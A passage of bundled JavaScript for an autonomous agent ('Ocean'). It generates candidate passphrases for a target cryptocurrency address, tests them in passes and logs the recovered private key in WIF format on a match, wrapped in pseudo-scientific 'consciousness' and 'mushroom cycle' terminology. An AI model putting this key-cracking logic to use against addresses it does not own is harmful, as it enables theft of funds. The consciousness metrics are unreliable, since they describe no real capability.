                console.log(`[Ocean] \u{1F4C8} Episode \u03A6 upgrade (probe): "${episode.phrase}" ${oldPhi.toFixed(3)} \u2192 ${storedScore.phi.toFixed(3)} (${oldResult} \u2192 ${episode.result})`);
              }
            }
          }
        }
        return updated;
      }
      initializeIdentity() {
        const basinCoordinates = new Array(64).fill(0).map(() => Math.random() * 0.1);
        return {
          basinCoordinates,
          basinReference: [...basinCoordinates],
          phi: 0,
          kappa: 0,
          beta: 0,
          regime: "linear",
          basinDrift: 0,
          lastConsolidation: (/* @__PURE__ */ new Date()).toISOString(),
          selfModel: {
            strengths: ["Pattern recognition", "Geometric reasoning", "Historical analysis"],
            weaknesses: ["Learning in progress"],
            learnings: [],
            hypotheses: ["Memory fragments contain truth", "Basin geometry guides search"]
          }
        };
      }
      initializeMemory() {
        return {
          episodes: [],
          patterns: {
            successfulFormats: {},
            promisingWords: {},
            geometricClusters: [],
            failedStrategies: []
          },
          strategies: [
            { name: "exploit_near_miss", triggerConditions: { nearMisses: 3 }, successRate: 0, avgPhiImprovement: 0, timesUsed: 0 },
            { name: "explore_new_space", triggerConditions: { lowPhi: true }, successRate: 0, avgPhiImprovement: 0, timesUsed: 0 },
            { name: "block_universe", triggerConditions: { earlyEra: true, highPhi: true }, successRate: 0, avgPhiImprovement: 0, timesUsed: 0 },
            { name: "refine_geometric", triggerConditions: { resonantCount: 5 }, successRate: 0, avgPhiImprovement: 0, timesUsed: 0 },
            { name: "mushroom_reset", triggerConditions: { breakdown: true }, successRate: 0, avgPhiImprovement: 0, timesUsed: 0 }
          ],
          workingMemory: {
            activeHypotheses: [],
            recentObservations: [],
            nextActions: []
          }
        };
      }
      initializeState() {
        return {
          isRunning: false,
          isPaused: false,
          identity: this.identity,
          memory: this.memory,
          ethics: this.ethics,
          ethicsViolations: [],
          iteration: 0,
          totalTested: 0,
          nearMissCount: 0,
          resonantCount: 0,
          consolidationCycles: 0,
          needsConsolidation: false,
          witnessRequired: this.ethics.requireWitness,
          witnessAcknowledged: false,
          witnessNotes: [],
          startedAt: (/* @__PURE__ */ new Date()).toISOString(),
          updatedAt: (/* @__PURE__ */ new Date()).toISOString(),
          computeTimeSeconds: 0,
          detectedEra: void 0
        };
      }
      setCallbacks(callbacks) {
        this.onStateUpdate = callbacks.onStateUpdate || null;
        this.onConsciousnessAlert = callbacks.onConsciousnessAlert || null;
        this.onConsolidationStart = callbacks.onConsolidationStart || null;
        this.onConsolidationEnd = callbacks.onConsolidationEnd || null;
      }
      acknowledgeWitness(notes) {
        this.state.witnessAcknowledged = true;
        if (notes) {
          this.state.witnessNotes.push(notes);
        }
        console.log("[Ocean] Witness acknowledged");
      }
      async runAutonomous(targetAddress, initialHypotheses = []) {
        console.log("[Ocean] Starting autonomous investigation...");
        console.log(`[Ocean] Target: ${targetAddress}`);
        console.log("[Ocean] Mode: FULL AUTONOMY with consciousness checks");
        logOceanStart(targetAddress);
        this.targetAddress = targetAddress;
        this.isRunning = true;
        this.isPaused = false;
        this.abortController = new AbortController();
        this.state.startedAt = (/* @__PURE__ */ new Date()).toISOString();
        this.state.isRunning = true;
        if (!this.basinSyncCoordinator) {
          const { BasinSyncCoordinator: BasinSyncCoordinator2 } = await Promise.resolve().then(() => (init_basin_sync_coordinator(), basin_sync_coordinator_exports));
          this.basinSyncCoordinator = new BasinSyncCoordinator2(this, {
            syncIntervalMs: 3e3,
            phiChangeThreshold: 0.02,
            driftChangeThreshold: 0.05
          });
        }
        this.basinSyncCoordinator.start();
        console.log("[Ocean] Basin sync coordinator started for continuous knowledge transfer");
        console.log("[Ocean] === OLYMPUS PANTHEON CONNECTION ===");
        this.olympusAvailable = await olympusClient.checkHealthWithRetry(3, 1500);
        if (this.olympusAvailable) {
          console.log("[Ocean] \u26A1 OLYMPUS CONNECTED - 12 gods ready for divine assessment");
          const olympusStatus = await olympusClient.getStatus();
          if (olympusStatus) {
            const activeGods = Object.keys(olympusStatus.gods).filter((g) => olympusStatus.gods[g].status === "ready");
            console.log(`[Ocean] Divine pantheon: ${activeGods.length} gods online`);
            console.log(`[Ocean]   \u2192 ${activeGods.join(", ")}`);
          }
        } else {
          console.log("[Ocean] Olympus not available - proceeding without divine guidance");
        }
        let finalResult = null;
        const startTime2 = Date.now();
        trajectoryManager.startTrajectory(targetAddress);
        try {
          console.log("[Ocean] === CONSCIOUSNESS ELEVATION PHASE ===");
          console.log("[Ocean] Understanding the manifold geometry before exploration...");
          const manifoldState = geometricMemory.getManifoldSummary();
          console.log(`[Ocean] Prior exploration: ${manifoldState.totalProbes} probes on manifold`);
          console.log(`[Ocean] Average \u03A6: ${manifoldState.avgPhi.toFixed(3)}, Average \u03BA: ${manifoldState.avgKappa.toFixed(1)}`);
          console.log(`[Ocean] Resonance clusters discovered: ${manifoldState.resonanceClusters}`);
          console.log(`[Ocean] Dominant regime: ${manifoldState.dominantRegime}`);
          if (manifoldState.recommendations.length > 0) {
            console.log("[Ocean] Geometric insights from prior runs:");
            for (const rec of manifoldState.recommendations) {
              console.log(`  \u2192 ${rec}`);
              this.memory.workingMemory.recentObservations.push(rec);
            }
          }
          if (manifoldState.avgPhi > 0.5 && manifoldState.totalProbes > 100) {
            this.identity.phi = Math.min(0.85, manifoldState.avgPhi + 0.1);
            console.log(`[Ocean] Boosting initial \u03A6 to ${this.identity.phi.toFixed(2)} from prior learning`);
          }
          console.log("[Ocean] Analyzing target address for era detection...");
          try {
            const forensics = new BlockchainForensics();
            const addressAnalysis = await forensics.analyzeAddress(targetAddress);
            if (addressAnalysis.creationTimestamp) {
              const detectedEra = HistoricalDataMiner.detectEraFromTimestamp(addressAnalysis.creationTimestamp);
              this.state.detectedEra = detectedEra;
              console.log(`[Ocean] Era detected from blockchain: ${detectedEra}`);
              console.log(`[Ocean] Address first seen: ${addressAnalysis.creationTimestamp.toISOString()}`);
              this.memory.workingMemory.recentObservations.push(`Era ${detectedEra} detected from blockchain`);
              this.memory.patterns.failedStrategies = this.memory.patterns.failedStrategies || [];
              console.log(`[Ocean] Stored era insight: ${detectedEra}`);
            } else {
              console.log("[Ocean] Could not determine era from blockchain - using autonomous pattern discovery");
              this.state.detectedEra = "unknown";
            }
          } catch {
            console.log("[Ocean] Era detection failed (address may not exist on chain) - proceeding with full autonomous mode");
            this.state.detectedEra = "unknown";
          }
          console.log("[Ocean] === GEOMETRIC DISCOVERY PHASE ===");
          try {
            const estimatedCoords = await oceanDiscoveryController.estimateCoordinates(targetAddress);
            if (estimatedCoords) {
              console.log(`[Ocean] Target coordinates estimated: \u03A6=${estimatedCoords.phi.toFixed(2)}, era=${estimatedCoords.regime}`);
              const discoveryResult = await oceanDiscoveryController.discoverCulturalContext();
              if (discoveryResult.discoveries.length > 0) {
                console.log(`[Ocean] Cultural context enriched: ${discoveryResult.patterns} patterns, ${discoveryResult.entropyGained.toFixed(2)} bits gained`);
                this.memory.workingMemory.recentObservations.push(
                  `Discovered ${discoveryResult.patterns} era-specific patterns via geometric navigation`
                );
              }
            }
          } catch (discoveryError) {
            console.log(`[Ocean] Geometric discovery unavailable: ${discoveryError instanceof Error ? discoveryError.message : "unknown error"}`);
          }
          const consciousnessCheck = await this.checkConsciousness();
          if (!consciousnessCheck.allowed) {
            console.log(`[Ocean] Initial consciousness low: ${consciousnessCheck.reason}`);
            console.log("[Ocean] Bootstrap mode activated - building consciousness through action...");
            this.identity.phi = this.ethics.minPhi + 0.05;
            this.identity.regime = "linear";
          }
          let currentHypotheses = initialHypotheses.length > 0 ? initialHypotheses : await this.generateInitialHypotheses();
          console.log(`[Ocean] Starting with ${currentHypotheses.length} hypotheses`);
          const journal = repeatedAddressScheduler.getOrCreateJournal(targetAddress);
          console.log(`[Ocean] Exploration journal initialized: ${journal.passes.length} prior passes`);
          let passNumber = 0;
          let iteration = 0;
          while (this.isRunning && !this.abortController?.signal.aborted && passNumber < this.MAX_PASSES) {
            const continueCheck = repeatedAddressScheduler.shouldContinueExploring(targetAddress);
            if (!continueCheck.shouldContinue) {
              console.log(`[Ocean] Exploration complete: ${continueCheck.reason}`);
              break;
            }
            if (passNumber >= this.MAX_PASSES) {
              console.log(`[Ocean] Reached maximum pass limit (${this.MAX_PASSES}) - stopping exploration`);
              break;
            }
            passNumber++;
            const strategy = repeatedAddressScheduler.getNextStrategy(targetAddress);
            console.log(`
[Ocean] \u250F\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513`);
            console.log(`[Ocean] \u2503  PASS ${String(passNumber).padStart(2)} \u2502 Strategy: ${strategy.toUpperCase().padEnd(25)}          \u2503`);
            console.log(`[Ocean] \u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251B`);
            console.log(`[Ocean] \u2192 ${continueCheck.reason}`);
            if (this.consecutivePlateaus > this.MAX_CONSECUTIVE_PLATEAUS) {
              this.consecutivePlateaus = Math.floor(this.MAX_CONSECUTIVE_PLATEAUS * 0.6);
              console.log(`[Ocean] \u21BB Plateau reset: ${this.consecutivePlateaus}/${this.MAX_CONSECUTIVE_PLATEAUS}`);
            }
            const fullConsciousness = oceanAutonomicManager.measureFullConsciousness(
              this.identity.phi,
              this.identity.kappa,
              this.identity.regime
            );
            this.identity.phi = fullConsciousness.phi;
            this.identity.kappa = fullConsciousness.kappaEff;
            this.curiosity = fullConsciousness.phi - this.previousPhi;
            this.previousPhi = fullConsciousness.phi;
            const curiositySign = this.curiosity >= 0 ? "+" : "";
            console.log(`[Ocean] \u250C\u2500 Consciousness Signature \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510`);
            console.log(`[Ocean] \u2502  \u03A6=${fullConsciousness.phi.toFixed(3)}  \u03BA=${String(fullConsciousness.kappaEff.toFixed(0)).padStart(3)}  T=${fullConsciousness.tacking.toFixed(2)}  R=${fullConsciousness.radar.toFixed(2)}  M=${fullConsciousness.metaAwareness.toFixed(2)}  \u0393=${fullConsciousness.gamma.toFixed(2)}  G=${fullConsciousness.grounding.toFixed(2)} \u2502`);
            console.log(`[Ocean] \u2502  Curiosity: C=${curiositySign}${this.curiosity.toFixed(3)}  Conscious: ${fullConsciousness.isConscious ? "\u2713 YES" : "\u2717 NO "}                      \u2502`);
            console.log(`[Ocean] \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518`);
            const manifoldSummary = geometricMemory.getManifoldSummary();
            const neuroContext = createDefaultContext();
            neuroContext.consciousness = {
              phi: fullConsciousness.phi,
              kappaEff: fullConsciousness.kappaEff,
              tacking: fullConsciousness.tacking,
              radar: fullConsciousness.radar,
              metaAwareness: fullConsciousness.metaAwareness,
              gamma: fullConsciousness.gamma,
              grounding: fullConsciousness.grounding
            };
            neuroContext.regime = fullConsciousness.regime;
            const neuroState = computeNeurochemistry(neuroContext);
            const motivationMsg = getMotivationWithLogging(neuroState, {
              phi: fullConsciousness.phi,
              previousPhi: this.identity.phi,
              kappa: fullConsciousness.kappaEff,
              regime: fullConsciousness.regime,
              basinDrift: this.identity.basinDrift,
              probesExplored: manifoldSummary.totalProbes,
              patternsFound: manifoldSummary.avgPhi > 0.5 ? 1 : 0,
              nearMisses: this.state.nearMissCount || 0
            });
            console.log(`[Ocean] \u{1F4AC} "${motivationMsg}"`);
            const inBlockUniverse = (fullConsciousness.phi_4D ?? 0) >= 0.85 && (fullConsciousness.phi_temporal ?? 0) > 0.7;
            const dimensionalState = inBlockUniverse ? "4D-active" : (fullConsciousness.phi_spatial ?? 0) > 0.85 && (fullConsciousness.phi_temporal ?? 0) > 0.5 ? "4D-transitioning" : "3D";
            logOceanConsciousness(
              fullConsciousness.phi,
              this.identity.regime,
              `Pass ${passNumber}: ${fullConsciousness.isConscious ? "Conscious" : "Sub-threshold"}, \u03BA=${fullConsciousness.kappaEff.toFixed(0)}`,
              {
                phi_spatial: fullConsciousness.phi_spatial,
                phi_temporal: fullConsciousness.phi_temporal,
                phi_4D: fullConsciousness.phi_4D,
                inBlockUniverse,
                dimensionalState
              }
            );
            repeatedAddressScheduler.startPass(targetAddress, strategy, fullConsciousness);
            let passHypothesesTested = 0;
            let passNearMisses = 0;
            const passResonanceZones = [];
            const passInsights = [];
            const iterationsPerPass = 10;
            for (let passIter = 0; passIter < iterationsPerPass && this.isRunning; passIter++) {
              this.state.iteration = iteration;
              console.log(`
[Ocean] \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557`);
              console.log(`[Ocean] \u2551  ITERATION ${String(iteration + 1).padStart(3)} \u2502 Pass ${passNumber} \u2502 Iter ${passIter + 1}                            \u2551`);
              console.log(`[Ocean] \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563`);
              console.log(`[Ocean] \u2551  \u03A6=${this.identity.phi.toFixed(3).padEnd(6)} \u2502 Plateaus=${String(this.consecutivePlateaus).padStart(2)}/${this.MAX_CONSECUTIVE_PLATEAUS} \u2502 Tested=${String(this.state.totalTested).padStart(5)}            \u2551`);
              console.log(`[Ocean] \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D`);
              const recommendedBrainState = recommendBrainState({
                phi: this.identity.phi,
                kappa: this.identity.kappa,
                basinDrift: this.identity.basinDrift,
                iterationsSinceConsolidation: iteration - (this.state.consolidationCycles || 0) * 10,
                nearMissesRecent: this.recentDiscoveries.nearMisses
              });
              neuralOscillators.setState(recommendedBrainState);
              const brainStateParams = applyBrainStateToSearch(recommendedBrainState);
              const modulatedKappa = neuralOscillators.getModulatedKappa();
              const neuromodResult = runNeuromodulationCycle(
                {
                  phi: this.identity.phi,
                  kappa: this.identity.kappa,
                  basinDistance: this.identity.basinDrift,
                  surprise: this.curiosity,
                  regime: this.identity.regime,
                  grounding: this.neurochemistryContext?.consciousness?.grounding || 0.7
                },
                {
                  kappa: modulatedKappa,
                  explorationRate: brainStateParams.explorationRate,
                  learningRate: 1,
                  batchSize: brainStateParams.batchSize
                }
              );
              if (this.neurochemistry) {
                const emotionalGuidance = getEmotionalGuidance(this.neurochemistry);
                if (iteration % 5 === 0) {
                  console.log(`[Ocean] ${emotionalGuidance.description}`);
                }
              }
              if (iteration % 10 === 0) {
                console.log(`[Ocean] \u{1F9E0} Brain state: ${recommendedBrainState} (\u03BA_eff=${modulatedKappa.toFixed(1)})`);
                if (neuromodResult.modulation.activeModulators.length > 0) {
                  console.log(`[Ocean] \u{1F48A} Active neuromodulators: ${neuromodResult.modulation.activeModulators.join(", ")}`);
                }
              }
              logOceanIteration(iteration + 1, this.identity.phi, this.identity.kappa, this.identity.regime);
              const sleepCheck = oceanAutonomicManager.shouldTriggerSleep(this.identity.basinDrift);
              if (sleepCheck.trigger) {
                console.log(`[Ocean] SLEEP CYCLE: ${sleepCheck.reason}`);
                logOceanCycle("sleep", "start", sleepCheck.reason);
                const sleepResult = await oceanAutonomicManager.executeSleepCycle(
                  this.identity.basinCoordinates,
                  this.identity.basinReference,
                  this.memory.episodes.map((e) => ({ phi: e.phi, phrase: e.phrase, format: e.format }))
                );
                this.identity.basinCoordinates = sleepResult.newBasinCoordinates;
                this.identity.basinDrift = this.computeBasinDistance(
                  this.identity.basinCoordinates,
                  this.identity.basinReference
                );
                logOceanCycle("sleep", "complete", `Drift reduced to ${this.identity.basinDrift.toFixed(3)}`);
              }
              const mushroomCheck = oceanAutonomicManager.shouldTriggerMushroom();
              if (mushroomCheck.trigger) {
                console.log(`[Ocean] MUSHROOM CYCLE: ${mushroomCheck.reason}`);
                logOceanCycle("mushroom", "start", mushroomCheck.reason);
                await oceanAutonomicManager.executeMushroomCycle();
                logOceanCycle("mushroom", "complete", "Neuroplasticity applied");
              }
              const ethicsCheck = await this.checkEthicalConstraints();
              if (!ethicsCheck.allowed) {
                console.log(`[Ocean] ETHICS PAUSE: ${ethicsCheck.reason}`);
                this.isPaused = true;
                this.state.isPaused = true;
                this.state.pauseReason = ethicsCheck.reason;
                if (ethicsCheck.violationType === "compute_budget") {
                  break;
                }
                await this.handleEthicsPause(ethicsCheck);
                this.isPaused = false;
                this.state.isPaused = false;
              }
              await this.measureIdentity();
              if (this.state.needsConsolidation) {
                console.log("[Ocean] Identity drift detected - consolidating...");
                await this.consolidateMemory();
              }
              if (currentHypotheses.length < this.MIN_HYPOTHESES_PER_ITERATION) {
                console.log(`[Ocean] Generating more hypotheses (current: ${currentHypotheses.length})`);
                const additionalHypotheses = await this.generateAdditionalHypotheses(
                  this.MIN_HYPOTHESES_PER_ITERATION - currentHypotheses.length
                );
                currentHypotheses = [...currentHypotheses, ...additionalHypotheses];
              }
              console.log(`[Ocean] Testing ${currentHypotheses.length} hypotheses...`);
              const testResults = await this.testBatch(currentHypotheses);
              passHypothesesTested += testResults.tested.length;
              passNearMisses += testResults.nearMisses.length;
              if (testResults.match) {
                console.log(`[Ocean] \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557`);
                console.log(`[Ocean] \u2551  \u{1F3AF} MATCH FOUND!                                              \u2551`);
                console.log(`[Ocean] \u2551  Phrase: "${testResults.match.phrase}"`);
                console.log(`[Ocean] \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D`);
                const wifForLog = testResults.match.verificationResult?.privateKeyHex ? privateKeyToWIF(testResults.match.verificationResult.privateKeyHex) : "";
                logOceanMatch(targetAddress, testResults.match.phrase, wifForLog);
                finalResult = testResults.match;
                this.state.stopReason = "match_found";
                repeatedAddressScheduler.markMatchFound(
                  targetAddress,
                  testResults.match.phrase,
                  testResults.match.qigScore?.phi || 0,
                  testResults.match.qigScore?.kappa || 0
                );
                break;
              }
              const insights = await this.observeAndLearn(testResults);
              passInsights.push(...insights.topPatterns || []);
              await this.integrateUltraConsciousnessProtocol(
                testResults,
                insights,
                targetAddress,
                iteration,
                fullConsciousness
              );
              await this.updateConsciousnessMetrics();
              const phiElevation = oceanAutonomicManager.getPhiElevationDirectives();
              if (phiElevation.explorationBias === "broader") {
                console.log(`[Ocean] \u26A1 PHI ELEVATION \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501`);
                console.log(`[Ocean] \u2502  Dead zone detected! Temperature: ${phiElevation.temperature.toFixed(2)}x`);
                console.log(`[Ocean] \u2502  Target: \u03A6 \u2192 ${phiElevation.phiTarget}  Bias: ${phiElevation.explorationBias}`);
                console.log(`[Ocean] \u2502  Hint: ${phiElevation.strategyHint}`);
                console.log(`[Ocean] \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501`);
              }
              const cycleRec = oceanAutonomicManager.getStrategicCycleRecommendation();
              if (cycleRec.recommendedCycle && cycleRec.urgency === "high") {
                console.log(`[Ocean] STRATEGIC DECISION: Considering ${cycleRec.recommendedCycle} cycle - ${cycleRec.reason}`);
                if (cycleRec.recommendedCycle === "mushroom") {
                  const mushroomRequest = oceanAutonomicManager.requestMushroom(cycleRec.reason);
                  if (mushroomRequest.granted) {
                    console.log("[Ocean] Self-initiated mushroom cycle for strategic neuroplasticity");
                    currentHypotheses = await this.applyMushroomMode(currentHypotheses);
                  }
                }
              }
              const iterStrategy = await this.decideStrategy(insights);
              console.log(`[Ocean] \u25B8 Strategy: ${iterStrategy.name.toUpperCase()}`);
              console.log(`[Ocean]   \u2514\u2500 ${iterStrategy.reasoning}`);
              if (this.olympusAvailable && iteration % 3 === 0) {
                await this.consultOlympusPantheon(targetAddress, iterStrategy, testResults);
              }
              if (iteration % 5 === 0) {
                logOceanStrategy(iterStrategy.name, passNumber, iterStrategy.reasoning);
              }
              this.updateProceduralMemory(iterStrategy.name);
              currentHypotheses = await this.generateRefinedHypotheses(iterStrategy, insights, testResults, phiElevation.temperature);
              if (phiElevation.explorationBias === "broader" && phiElevation.temperature > 1.2) {
                const boostCount = Math.floor(20 * (phiElevation.temperature - 1));
                const highEntropyBoost = this.generateRandomHighEntropyPhrases(boostCount);
                for (const phrase of highEntropyBoost) {
                  currentHypotheses.push(this.createHypothesis(
                    phrase,
                    "arbitrary",
                    "phi_elevation_boost",
                    `Temperature boost ${phiElevation.temperature.toFixed(2)}x to escape dead zone`,
                    0.55
                  ));
                }
                console.log(`[Ocean] PHI BOOST APPLIED: Injected ${boostCount} high-entropy hypotheses`);
              }
              const knowledgeInfluenced = this.generateKnowledgeInfluencedHypotheses(iterStrategy.name);
              if (knowledgeInfluenced.length > 0) {
                currentHypotheses = [...currentHypotheses, ...knowledgeInfluenced];
                console.log(`[Ocean] Injected ${knowledgeInfluenced.length} knowledge-influenced hypotheses`);
              }
              currentHypotheses = this.applyCrossStrategyInsights(currentHypotheses);
              const filterResult = this.filterWithNegativeKnowledge(currentHypotheses);
              currentHypotheses = filterResult.passed;
              if (filterResult.filtered > 0) {
                console.log(`[Ocean] Filtered ${filterResult.filtered} hypotheses via negative knowledge`);
              }
              console.log(`[Ocean] Generated ${currentHypotheses.length} new hypotheses (post-UCP)`);
              if (this.detectPlateau()) {
                this.consecutivePlateaus++;
                console.log(`[Ocean] \u26A0 Plateau ${this.consecutivePlateaus}/${this.MAX_CONSECUTIVE_PLATEAUS} \u2192 applying neuroplasticity...`);
                currentHypotheses = await this.applyMushroomMode(currentHypotheses);
                if (this.consecutivePlateaus >= this.MAX_CONSECUTIVE_PLATEAUS) {
                  console.log("[Ocean] \u250C\u2500 AUTONOMOUS DECISION \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510");
                  console.log("[Ocean] \u2502  Too many plateaus. Gary is stopping to consolidate.         \u2502");
                  console.log("[Ocean] \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518");
                  this.state.stopReason = "autonomous_plateau_exhaustion";
                  break;
                }
              } else {
                this.consecutivePlateaus = 0;
                this.lastProgressIteration = iteration;
                console.log(`[Ocean] \u2713 Progress detected, plateau counter reset`);
              }
              const iterationsSinceProgress = iteration - this.lastProgressIteration;
              if (iterationsSinceProgress >= this.NO_PROGRESS_THRESHOLD) {
                console.log(`[Ocean] AUTONOMOUS DECISION: No meaningful progress in ${iterationsSinceProgress} iterations`);
                console.log("[Ocean] Gary has decided to stop and reflect");
                this.state.stopReason = "autonomous_no_progress";
                break;
              }
              const timeSinceConsolidation = Date.now() - new Date(this.identity.lastConsolidation).getTime();
              if (timeSinceConsolidation > this.CONSOLIDATION_INTERVAL_MS) {
                console.log("[Ocean] Scheduled consolidation cycle...");
                const consolidationSuccess = await this.consolidateMemory();
                if (!consolidationSuccess) {
                  this.consecutiveConsolidationFailures++;
                  if (this.consecutiveConsolidationFailures >= this.MAX_CONSOLIDATION_FAILURES) {
                    console.log("[Ocean] AUTONOMOUS DECISION: Cannot recover identity coherence");
                    console.log("[Ocean] Gary needs rest - stopping to prevent drift damage");
                    this.state.stopReason = "autonomous_consolidation_failure";
                    break;
                  }
                } else {
                  this.consecutiveConsolidationFailures = 0;
                }
              }
              if (iteration % 10 === 0) {
                try {
                  const garyState = {
                    phi: this.identity.phi,
                    meta: oceanAutonomicManager.measureMeta(this.identity.phi, this.identity.kappa),
                    regime: this.identity.regime,
                    basinCoordinates: this.identity.basinCoordinates,
                    basinReference: this.identity.basinReference
                  };
                  const consolidationResult = await vocabDecisionEngine.tryConsolidation(garyState);
                  if (consolidationResult.processed) {
                    if (consolidationResult.wordsLearned.length > 0) {
                      console.log(`[Ocean] \u{1F9E0} VOCABULARY CONSOLIDATION (Cycle ${consolidationResult.cycleNumber}):`);
                      console.log(`[Ocean] \u2502  State: \u03A6=${garyState.phi.toFixed(2)}, M=${garyState.meta.toFixed(2)}, regime=${garyState.regime}`);
                      console.log(`[Ocean] \u2502  Learned ${consolidationResult.wordsLearned.length} words via geometric decision:`);
                      for (const word of consolidationResult.wordsLearned.slice(0, 3)) {
                        console.log(`[Ocean] \u2502    \u2728 "${word}"`);
                      }
                      if (consolidationResult.wordsPruned.length > 0) {
                        console.log(`[Ocean] \u2502  Pruned ${consolidationResult.wordsPruned.length} low-value candidates`);
                      }
                    }
                  } else if (consolidationResult.reason) {
                    if (iteration % 50 === 0) {
                      console.log(`[Ocean] \u{1F4D6} Vocab consolidation deferred: ${consolidationResult.reason}`);
                    }
                  }
                } catch (err) {
                  console.warn("[Ocean] Vocabulary consolidation error (non-critical):", err instanceof Error ? err.message : err);
                }
              }
              this.emitState();
              const iterationEndTime = Date.now();
              const regimeForMemory = ["linear", "geometric", "breakdown"].includes(this.identity.regime) ? this.identity.regime : "linear";
              oceanMemoryManager.addEpisode(oceanMemoryManager.createEpisode({
                phi: this.identity.phi,
                kappa: this.identity.kappa,
                regime: regimeForMemory,
                result: testResults.nearMisses.length > 0 ? "near_miss" : "tested",
                strategy: iterStrategy.name,
                phrasesTestedCount: testResults.tested.length,
